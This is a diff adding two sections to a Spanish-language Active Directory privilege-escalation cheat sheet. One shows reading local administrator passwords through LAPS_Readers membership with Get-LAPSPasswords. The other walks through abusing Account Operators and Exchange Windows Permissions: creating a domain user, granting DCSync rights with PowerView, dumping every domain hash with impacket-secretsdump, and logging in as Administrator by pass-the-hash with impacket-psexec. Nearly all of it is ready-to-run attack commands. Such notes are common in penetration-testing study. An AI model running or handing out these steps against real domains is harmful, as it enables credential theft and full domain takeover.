@@ -159,3 +159,42 @@ Pasos:
 ❯ sc.exe stop <service>         # Detener un servicio 
 ❯ sc.exe start <service>        # Iniciar un servicio 
 ```
+
+```powershell 
+3. 'LAPS_Readers' =  Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.
+
+
+Pasos:
+❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y y transferirlo a la máquina Windows comprometida
+❯ Import-Module Get-LAPSPasswords.ps1        # Importar el modulo 
+❯ Get-LAPSPasswords                          # Ejecutar la función para obtener la password de Administrator
+```
+
+
+```powershell
+4. 'Account Operators' = Si se esta en el grupo con 'GenericAll' sobre 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si se tiene un usuario en el grupo 'Exchange Windows Permissions' con 'WriteDacl', se puede ejecutar un DCSync sobre el dominio para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+
+
+Pasos:
+❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators'
+❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
+❯ net group        # Mirar los grupos existentes 
+❯ net user omar    # Mirar la info del usuario 
+
+
+# Agregar el privilegio de DCSync al usuario  
+❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+	# password = Contraseña del usuario 
+❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
+❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
+	# user = Usuario que se agrego en la variable $Cred
+
+Notas: 
+	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
+
+
+# Hacer DCSync desde Kali 
+❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
+	# IP-DC = La dirección IP del DC  
+❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
+```
